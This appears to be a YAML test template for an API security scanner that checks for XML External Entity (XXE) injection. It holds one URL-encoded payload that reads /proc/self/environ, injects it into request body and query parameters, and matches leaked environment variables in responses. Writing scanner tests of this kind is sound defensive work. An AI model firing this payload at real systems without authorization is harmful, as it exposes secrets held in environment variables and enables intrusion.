id: ENHANCED_XXE_READ_ENV_VAR
info:
  name: "Enhanced XML External Entity (XXE) test for reading Environment Variables"
  description: >
    "This test involves exploiting XML parsing vulnerabilities to extract sensitive environment variable data, potentially exposing critical information within the target system."
  details: >
    "This test leverages XML parsing weaknesses to intercept and disclose crucial environmental data, offering insights into the system's configuration and potential avenues for further exploitation."
  impact: >
    "Successful XML External Entity (XXE) test for reading Environment Variables can result in the unauthorized retrieval of sensitive system information, potentially exposing confidential data and creating avenues for subsequent security threats."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: XXE_READ_ENV_VAR
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
    - "https://www.akto.io/blog/xml-external-entity-attack"
    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
  cwe:
    - CWE-611
    - CWE-827
  cve:
    - CVE-2022-42745


attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST


api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  method:
    contains_either:
      - POST
      - PUT
      - PATCH
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: changed_body_key
    - query_param:
        for_one:
          key:
            regex: .*
            extract: changed_query_key
wordLists:
  payloads:
    - "%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%3E%5D%3E%3Cuser%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fuser%3E"
execute:
  type: single
  requests:
    - req:
        - for_each_combination: true
        - modify_body_param:
            ${changed_body_key}: ${payloads}
        - modify_query_param:
            changed_query_key: ${payloads}
validate:
  response_payload:
    regex: '(\w+=[\w\/\.\-:]+)(?:\0\w+=[\w\/\.\-:]+)*'
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
